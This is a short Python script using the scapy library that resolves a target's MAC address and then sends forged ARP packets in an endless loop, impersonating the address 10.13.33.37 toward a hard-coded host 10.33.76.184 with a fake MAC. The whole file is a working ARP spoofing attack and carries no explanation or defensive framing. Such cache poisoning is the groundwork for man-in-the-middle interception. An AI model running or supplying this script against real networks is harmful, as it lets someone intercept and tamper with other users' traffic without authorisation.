from scapy.all import *

def get_mac(ip): 
    arp_request = ARP(pdst = ip) 
    broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request 
    answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
    return answered_list[0][1].hwsrc 

def spoof(target_ip, spoof_ip, mac_change): 
    arp = ARP(op="who-has", hwdst = get_mac(target_ip), hwsrc = mac_change , psrc = spoof_ip, pdst=target_ip)

    send(arp, inter=1, verbose = False, loop=1 )


spoof("10.33.76.184", "10.13.33.37", "de:ad:be:ef:ca:fe")